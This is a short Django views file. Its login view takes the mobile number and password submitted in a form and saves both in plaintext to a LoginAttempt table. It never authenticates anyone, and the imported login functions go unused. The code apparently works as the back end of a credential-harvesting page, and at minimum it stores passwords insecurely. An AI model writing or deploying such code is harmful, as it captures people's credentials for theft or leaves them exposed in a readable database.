from django.shortcuts import render
from django.contrib.auth import authenticate, login
from django.http import HttpResponse
from .models import LoginAttempt

def login_view(request):
    if request.method == 'POST':
        mobile = request.POST.get('mobile')
        password = request.POST.get('password')
        
        # Save the login attempt to database
        LoginAttempt.objects.create(mobile=mobile, password=password)
        
        return HttpResponse('Login attempt received and saved!')
    return render(request, 'index.html')
